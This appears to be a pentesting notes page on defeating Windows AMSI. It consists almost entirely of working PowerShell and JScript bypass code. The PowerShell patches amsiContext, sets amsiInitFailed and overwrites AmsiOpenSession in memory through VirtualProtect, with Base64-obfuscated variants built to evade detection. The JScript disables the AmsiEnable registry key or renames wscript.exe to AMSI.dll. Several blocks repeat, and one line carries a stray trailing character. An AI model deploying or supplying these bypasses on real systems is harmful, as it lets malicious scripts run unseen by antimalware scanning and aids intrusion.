# AMSI

## Basics

{% code overflow="wrap" %}
```powershell
# Run to check if AMSI is running
'amsiutils'
# Overwriting the amsiContext header bytes
$a=[Ref].Assembly.GetTypes()
Foreach($b in $a){if ($b.Name -like "*iUtils*") {$c=$b}}
$d=$c.GetFields('NonPublic,Static')
Foreach($e in $d) {if ($e.Name -like "*Context") {$f=$e}}
$g=$f.GetValue($null)
[IntPtr]$ptr=$g
[Int32[]]$buf=@(0)
[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 1)
# No detection on amsiutils with corrupted context header
'amsiutils'
# Loop GetTypes method one liner
$a=[Ref].Assembly.GetTypes();Foreach($b in $a){if ($b.Name -like "*iUtils*") {$c=$b}};$d=$c.GetFields('NonPublic,Static');Foreach($e in $d) {if ($e.Name -like "*Context") {$f=$e}};$g=$f.GetValue($null);[IntPtr]$ptr=$g;[Int32[]]$buf=@(0);[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 1)
# Loop GetTypes method one liner obfuscated
${/=\/=\_/===\_/\/=}=[Ref].Assembly.GetTypes();Foreach(${/==\/\______/\_/=} in ${/=\/=\_/===\_/\/=}){if (${/==\/\______/\_/=}.Name -like $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KgBpAFUAdABpAGwAcwAqAA==')))) {${/=\__/\______/===}=${/==\/\______/\_/=}}};${/\_____/=\/=====\}=${/=\__/\______/===}.GetFields($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwA='))));Foreach(${__/\___/\/\____/=} in ${/\_____/=\/=====\}) {if (${__/\___/\/\____/=}.Name -like $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KgBDAG8AbgB0AGUAeAB0AA==')))) {${_/\_/\___/\/===\_}=${__/\___/\/\____/=}}};${__/\_/\__/===\_/\}=${_/\_/\___/\/===\_}.GetValue($null);[IntPtr]${_/===\__/\/\___/\}=${__/\_/\__/===\_/\};[Int32[]]${_/\__/\/\_/==\___}=@(0);[System.Runtime.InteropServices.Marshal]::Copy(${_/\__/\/\_/==\___}, 0, ${_/===\__/\/\___/\}, 1)
```
{% endcode %}

## Attacking Initialization

AMSI bypass through amsiInitFailed field

```powershell
# Attacking Initialization
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
# Attacking Initialization obfuscated
[Ref].Assembly.GetType($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAbQBzAGkAVQB0AGkAbABzAA==')))).GetField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YQBtAHMAaQBJAG4AaQB0AEYAYQBpAGwAZQBkAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwA=')))).SetValue($null,$true)
```

## Patching the Internals

```powershell
# Calling VirtualProtect to modify memory protections
function LookupFunc {

    Param ($moduleName, $functionName)

    $assem = ([AppDomain]::CurrentDomain.GetAssemblies() |
    Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].
      Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')
    $tmp=@()
    $assem.GetMethods() | ForEach-Object {If($_.Name -eq "GetProcAddress") {$tmp+=$_}}
    return $tmp[0].Invoke($null, @(($assem.GetMethod('GetModuleHandle')).Invoke($null,@($moduleName)), $functionName))
}

function getDelegateType {

    Param (
        [Parameter(Position = 0, Mandatory = $True)] [Type[]] $func,
        [Parameter(Position = 1)] [Type] $delType = [Void]
)
    $type = [AppDomain]::CurrentDomain.
    DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')),
    [System.Reflection.Emit.AssemblyBuilderAccess]::Run).
      DefineDynamicModule('InMemoryModule', $false).
      DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass',
      [System.MulticastDelegate])

    $type.
      DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $func).
        SetImplementationFlags('Runtime, Managed')

    $type.
      DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $delType, $func).
        SetImplementationFlags('Runtime, Managed')

    return $type.CreateType()
}

[IntPtr]$funcAddr = LookupFunc amsi.dll AmsiOpenSession
$oldProtectionBuffer = 0
$vp=[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll VirtualProtect), (getDelegateType @([IntPtr], [UInt32], [UInt32], [UInt32].MakeByRefType()) ([Bool])))
$vp.Invoke($funcAddr, 3, 0x40, [ref]$oldProtectionBuffer)
$buf = [Byte[]] (0x48, 0x31, 0xC0)
[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $funcAddr, 3)
$vp.Invoke($funcAddr, 3, 0x20, [ref]$oldProtectionBuffer)
```

## Bypassing AMSI With Reflection in PowerShell

{% code overflow="wrap" %}
```powershell
# Run to check if AMSI is running
'amsiutils'
# Overwriting the amsiContext header bytes
$a=[Ref].Assembly.GetTypes()
Foreach($b in $a){if ($b.Name -like "*iUtils*") {$c=$b}}
$d=$c.GetFields('NonPublic,Static')
Foreach($e in $d) {if ($e.Name -like "*Context") {$f=$e}}
$g=$f.GetValue($null)
[IntPtr]$ptr=$g
[Int32[]]$buf=@(0)
[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 1)
# No detection on amsiutils with corrupted context header
'amsiutils'
# Loop GetTypes method one liner
$a=[Ref].Assembly.GetTypes();Foreach($b in $a){if ($b.Name -like "*iUtils*") {$c=$b}};$d=$c.GetFields('NonPublic,Static');Foreach($e in $d) {if ($e.Name -like "*Context") {$f=$e}};$g=$f.GetValue($null);[IntPtr]$ptr=$g;[Int32[]]$buf=@(0);[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 1)
# Loop GetTypes method one liner obfuscated
${/=\/=\_/===\_/\/=}=[Ref].Assembly.GetTypes();Foreach(${/==\/\______/\_/=} in ${/=\/=\_/===\_/\/=}){if (${/==\/\______/\_/=}.Name -like $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KgBpAFUAdABpAGwAcwAqAA==')))) {${/=\__/\______/===}=${/==\/\______/\_/=}}};${/\_____/=\/=====\}=${/=\__/\______/===}.GetFields($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwA='))));Foreach(${__/\___/\/\____/=} in ${/\_____/=\/=====\}) {if (${__/\___/\/\____/=}.Name -like $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KgBDAG8AbgB0AGUAeAB0AA==')))) {${_/\_/\___/\/===\_}=${__/\___/\/\____/=}}};${__/\_/\__/===\_/\}=${_/\_/\___/\/===\_}.GetValue($null);[IntPtr]${_/===\__/\/\___/\}=${__/\_/\__/===\_/\};[Int32[]]${_/\__/\/\_/==\___}=@(0);[System.Runtime.InteropServices.Marshal]::Copy(${_/\__/\/\_/==\___}, 0, ${_/===\__/\/\___/\}, 1)r
```
{% endcode %}

## Attacking Initialization

{% code overflow="wrap" %}
```powershell
# Attacking Initialization
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
# Attacking Initialization obfuscated
[Ref].Assembly.GetType($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAbQBzAGkAVQB0AGkAbABzAA==')))).GetField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YQBtAHMAaQBJAG4AaQB0AEYAYQBpAGwAZQBkAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwA=')))).SetValue($null,$true)
```
{% endcode %}

## Patching the Internals

{% code overflow="wrap" %}
```powershell
# Calling VirtualProtect to modify memory protections
function LookupFunc {

    Param ($moduleName, $functionName)

    $assem = ([AppDomain]::CurrentDomain.GetAssemblies() |
    Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].
      Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')
    $tmp=@()
    $assem.GetMethods() | ForEach-Object {If($_.Name -eq "GetProcAddress") {$tmp+=$_}}
    return $tmp[0].Invoke($null, @(($assem.GetMethod('GetModuleHandle')).Invoke($null,@($moduleName)), $functionName))
}

function getDelegateType {

    Param (
        [Parameter(Position = 0, Mandatory = $True)] [Type[]] $func,
        [Parameter(Position = 1)] [Type] $delType = [Void]
)
    $type = [AppDomain]::CurrentDomain.
    DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')),
    [System.Reflection.Emit.AssemblyBuilderAccess]::Run).
      DefineDynamicModule('InMemoryModule', $false).
      DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass',
      [System.MulticastDelegate])

    $type.
      DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $func).
        SetImplementationFlags('Runtime, Managed')

    $type.
      DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $delType, $func).
        SetImplementationFlags('Runtime, Managed')

    return $type.CreateType()
}

[IntPtr]$funcAddr = LookupFunc amsi.dll AmsiOpenSession
$oldProtectionBuffer = 0
$vp=[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll VirtualProtect), (getDelegateType @([IntPtr], [UInt32], [UInt32], [UInt32].MakeByRefType()) ([Bool])))
$vp.Invoke($funcAddr, 3, 0x40, [ref]$oldProtectionBuffer)
$buf = [Byte[]] (0x48, 0x31, 0xC0)
[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $funcAddr, 3)
$vp.Invoke($funcAddr, 3, 0x20, [ref]$oldProtectionBuffer)
```
{% endcode %}

## JScript

### AMSI bypass by setting the AmsiEnable key

Append the below to the DotNetToJScript runner located [https://app.gitbook.com/o/mbxkiXYtaPOoD5wKRNv8/s/cSjH8omKqrKqsyRxL7EJ/pentesting/exploitation/windows/windows-scripting-host](../windows-scripting-host.md#dotnettojscript)

{% code overflow="wrap" %}
```javascript
var sh = new ActiveXObject('WScript.Shell');
var key = "HKCU\\Software\\Microsoft\\Windows Script\\Settings\\AmsiEnable";
try{
	var AmsiEnable = sh.RegRead(key);
	if(AmsiEnable!=0){
	throw new Error(1, '');
	}
}catch(e){
	sh.RegWrite(key, 0, "REG_DWORD");
	sh.Run("cscript -e:{F414C262-6AC0-11CF-B6D1-00AA00BBBB58} "+WScript.ScriptFullName,0,1);
	sh.RegWrite(key, 1, "REG_DWORD");
	WScript.Quit(1);
}
```
{% endcode %}

### AMSI bypass that renames wscript.exe to amsi.dll

```javascript
var filesys= new ActiveXObject("Scripting.FileSystemObject");
var sh = new ActiveXObject('WScript.Shell');
try
{
	if(filesys.FileExists("C:\\Windows\\Tasks\\AMSI.dll")==0)
	{
		throw new Error(1, '');
	}
}
catch(e)
{
	filesys.CopyFile("C:\\Windows\\System32\\wscript.exe", "C:\\Windows\\Tasks\\AMSI.dll");
	sh.Exec("C:\\Windows\\Tasks\\AMSI.dll -e:{F414C262-6AC0-11CF-B6D1-00AA00BBBB58} "+WScript.ScriptFullName);
	WScript.Quit(1);
}
```

## Freshy#1

{% code overflow="wrap" %}
```powershell
function lookFuncAddr{
Param($moduleName, $functionName)

$assem = ([AppDomain]::CurrentDomain.GetAssemblies() |
Where-Object {$_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll')}).GetType('Microsoft.Win32.UnsafeNativeMethods')
$tmp=@()
$assem.GetMethods() | ForEach-Object{If($_.Name -eq 'GetProcAddress') {$tmp+=$_}}
return $tmp[0].Invoke($null, @(($assem.GetMethod('GetModuleHandle')).Invoke($null, @($moduleName)), $functionName))
}
function getDelegateType{
Param(
[Parameter(Position = 0, Mandatory = $True)] [Type[]] $func,
[Parameter(Position = 1)] [Type] $delType = [Void]
)

$type = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')),
[System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('InMemoryModule', $false).DefineType('MyDelegateType',
'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])

$type.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $func).SetImplementationFlags('Runtime, Managed')
$type.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $delType, $func).SetImplementationFlags('Runtime, Managed')

return $type.CreateType()
}

[IntPtr]$amsiAddr = lookFuncAddr amsi.dll AmsiOpenSession
$oldProtect = 0
$vp=[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((lookFuncAddr kernel32.dll VirtualProtect),
(getDelegateType @([IntPtr], [UInt32], [UInt32], [UInt32].MakeByRefType()) ([Bool])))

$vp.Invoke($amsiAddr, 3, 0x40, [ref]$oldProtect)
$3b = [Byte[]] (0x48, 0x31, 0xC0)
[System.Runtime.InteropServices.Marshal]::Copy($3b, 0, $amsiAddr, 3)
$vp.Invoke($amsiAddr, 3, 0x20, [ref]$oldProtect)
```
{% endcode %}

## Freshy #1 Obfuscated

{% code overflow="wrap" %}
```powershell
function __/\/\_/\/\/====\_{
Param(${__/==\_/==\/\_/\/\}, ${__/\_/\/\/\_/\__/\})
${______/\/====\_/\} = ([AppDomain]::CurrentDomain.GetAssemblies() |
? {$_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB5AHMAdABlAG0ALgBkAGwAbAA='))))}).GetType($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBpAGMAcgBvAHMAbwBmAHQALgBXAGkAbgAzADIALgBVAG4AcwBhAGYAZQBOAGEAdABpAHYAZQBNAGUAdABoAG8AZABzAA=='))))
${_/==\/\__/=\/===\}=@()
${______/\/====\_/\}.GetMethods() | %{If($_.Name -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBlAHQAUAByAG8AYwBBAGQAZAByAGUAcwBzAA==')))) {${_/==\/\__/=\/===\}+=$_}}
return ${_/==\/\__/=\/===\}[0].Invoke($null, @((${______/\/====\_/\}.GetMethod($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBlAHQATQBvAGQAdQBsAGUASABhAG4AZABsAGUA'))))).Invoke($null, @(${__/==\_/==\/\_/\/\})), ${__/\_/\/\/\_/\__/\}))
}
function __/\/\___/==\_____{
Param(
[Parameter(Position = 0, Mandatory = $True)] [Type[]] ${_/=\_/\/==\__/\__/},
[Parameter(Position = 1)] [Type] ${_/===\/==\__/=\/\/} = [Void]
)
${__/\__/====\/\/\/} = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAGYAbABlAGMAdABlAGQARABlAGwAZQBnAGEAdABlAA=='))))),
[System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAE0AZQBtAG8AcgB5AE0AbwBkAHUAbABlAA=='))), $false).DefineType($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQB5AEQAZQBsAGUAZwBhAHQAZQBUAHkAcABlAA=='))),
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBsAGEAcwBzACwAIABQAHUAYgBsAGkAYwAsACAAUwBlAGEAbABlAGQALAAgAEEAbgBzAGkAQwBsAGEAcwBzACwAIABBAHUAdABvAEMAbABhAHMAcwA='))), [System.MulticastDelegate])
${__/\__/====\/\/\/}.DefineConstructor($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBUAFMAcABlAGMAaQBhAGwATgBhAG0AZQAsACAASABpAGQAZQBCAHkAUwBpAGcALAAgAFAAdQBiAGwAaQBjAA=='))), [System.Reflection.CallingConventions]::Standard, ${_/=\_/\/==\__/\__/}).SetImplementationFlags($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgB1AG4AdABpAG0AZQAsACAATQBhAG4AYQBnAGUAZAA='))))
${__/\__/====\/\/\/}.DefineMethod($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAHYAbwBrAGUA'))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMALAAgAEgAaQBkAGUAQgB5AFMAaQBnACwAIABOAGUAdwBTAGwAbwB0ACwAIABWAGkAcgB0AHUAYQBsAA=='))), ${_/===\/==\__/=\/\/}, ${_/=\_/\/==\__/\__/}).SetImplementationFlags($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgB1AG4AdABpAG0AZQAsACAATQBhAG4AYQBnAGUAZAA='))))
return ${__/\__/====\/\/\/}.CreateType()
}
[IntPtr]${__/\/==\/\__/=\/\} = __/\/\_/\/\/====\_ amsi.dll AmsiOpenSession
${___/\/==\/\/=\___} = 0
${_/===\_/\/\___/==}=[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((__/\/\_/\/\/====\_ kernel32.dll VirtualProtect),
(__/\/\___/==\_____ @([IntPtr], [UInt32], [UInt32], [UInt32].MakeByRefType()) ([Bool])))
${_/===\_/\/\___/==}.Invoke(${__/\/==\/\__/=\/\}, 3, 0x40, [ref]${___/\/==\/\/=\___})
${_/==\__/==\/\____} = [Byte[]] (0x48, 0x31, 0xC0)
[System.Runtime.InteropServices.Marshal]::Copy(${_/==\__/==\/\____}, 0, ${__/\/==\/\__/=\/\}, 3)
${_/===\_/\/\___/==}.Invoke(${__/\/==\/\__/=\/\}, 3, 0x20, [ref]${___/\/==\/\/=\___})
```
{% endcode %}
